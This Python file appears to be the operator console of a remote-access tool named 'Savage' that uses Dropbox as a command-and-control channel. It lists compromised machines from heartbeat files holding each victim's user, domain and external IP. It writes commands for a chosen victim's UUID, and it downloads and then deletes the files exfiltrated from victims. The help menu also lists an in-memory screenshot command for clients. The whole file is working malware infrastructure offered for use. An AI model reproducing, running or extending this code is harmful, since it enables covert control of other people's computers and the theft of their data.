import sys
import os
import time
import platform
import dropbox
import json

from rich.console import Console
from rich.table import Table

def clear_screen():
	os.system('cls') if platform.system() == 'Windows' else os.system('clear')
	
def banner():
	console.print("\n[bold magenta]###>~!:[/bold magenta] +*= Savage =*+ [bold magenta]:!~<###~[/bold magenta]")
	console.print("###>~!:\t   PUBLIC [bold yellow]0.1[/bold yellow]  :!~<###~\n")

def main_menu():
	clear_screen()
	banner()
	choice = console.input("[bold green]>>[/bold green] ")
	exec_menu(choice)
	return

def help():

	banner()

	console.print("""

	SERVER
	------

	[bold cyan]list[/bold cyan]		- List of <uuid>s
	[bold cyan]command[/bold cyan]		- Send command to <uuid>
	[bold cyan]fetch[/bold cyan]		- Fetch exfil from <uuid>
	[bold cyan]help[/bold cyan]
	[bold cyan]exit[/bold cyan]\n

	CLIENT
	------

	[bold cyan]:screen[/bold cyan]			- In-Memory Screenshot
	""")

	choice = console.input("[bold green]>>[/bold green] ")
	exec_menu(choice)
	return

def exec_menu(choice):
	clear_screen()
	ch = choice.lower()
	if ch == '':
		menu_actions['main_menu']()
	else:
		try:
			menu_actions[ch]()
		except KeyError:
			print("Invalid selection, please try again.\n")
			menu_actions['main_menu']()
	return


def client_list():

	banner()

	# List of all files in root
	_files = dbx.files_list_folder(path="")

	if "Heartbeat" in str(_files.entries):	
		table = Table(show_header=True, header_style="bold cyan")
		
		table.add_column("UUID", width=36)
		table.add_column("Domain/User")
		table.add_column("External IP", width=15)
		table.add_column("Last Seen", width=24)

	# Loop through files,
	for f in _files.entries:

		# If "Heartbeat" file is found, 
		if "Heartbeat" in f.name:
			
			# Pull UUID from filename, 
			uuid = f.name.replace("-Heartbeat.txt", "")
			metadata, f = dbx.files_download(f"/{f.name}")	

			# Decode JSON object
			_sysinfo = json.loads(f.content.decode())
			
			# Add row
			table.add_row(uuid, _sysinfo['computer_domain'] + "\\" + _sysinfo['user'], _sysinfo['external_ip'], _sysinfo['timestamp'])

	console.print(table)
	choice = console.input("[bold green]>>[/bold green] ")
	exec_menu(choice)
	return

def command():
	banner()

	uuid = console.input("[bold green]UUID[/bold green]    [white]>>[/white] ")
	_cmd = console.input("[bold green]Command[/bold green] [white]>>[/white] ")

	# Check len of UUID, exit if less than 36
	if len(uuid) != 36:
		print("Invalid UUID length.")
		sys.exit(0)

	# Send command to UUID.
	console.print(f"\nSending [bold yellow]'{_cmd}'[/bold yellow] to [bold yellow]\"{uuid}\"[/bold yellow][white]...[/white]\n")
	dbx.files_upload(_cmd.encode(), f"/{uuid}-Commands.txt", mode=dropbox.files.WriteMode.overwrite)
	
	choice = console.input("[bold green]>>[/bold green] ")
	exec_menu(choice)

	return

def fetch():

	banner()
	
	uuid = console.input("[bold green]UUID[/bold green] [white]>>[/white]  ")
	console.print(f"\nFetching files for [bold yellow]\"{uuid}\"[/bold yellow][white]...[/white]\n")

	# List of all files in root
	_files = dbx.files_list_folder(path="")
	# Loop through files,
	for _dbfile in _files.entries:
		
		if "Heartbeat" not in _dbfile.name and "Commands" not in _dbfile.name and uuid in _dbfile.name:
			
			console.print(f"[green][magenta]\[*][/magenta][/green] Downloading \"{_dbfile.name}\"[white]...[/white]\n")
			metadata, f = dbx.files_download(f"/{_dbfile.name}")
			
			_outfile = open(_dbfile.name, 'wb')
			_outfile.write(f.content)
			_outfile.close()

			dbx.files_delete_v2(f"/{_dbfile.name}")

	choice = console.input("[bold green]>>[/bold green] ")
	exec_menu(choice)

	return

def back():
	menu_actions['main_menu']()

def exit():
	sys.exit()

# Attempt to obtain DRopBox instanance, quit if we cant.
try:
	access_token = ''
	dbx = dropbox.Dropbox(access_token)
except Exception:
	sys.exit(0)

menu_actions = {}
console = Console()

menu_actions = {
	'main_menu': main_menu,
	'list': client_list,
	'command': command,
	'fetch': fetch,
	'back' : back,
	'exit': exit,
	'help' : help,
}

# Main Program
if __name__ == "__main__":
	main_menu()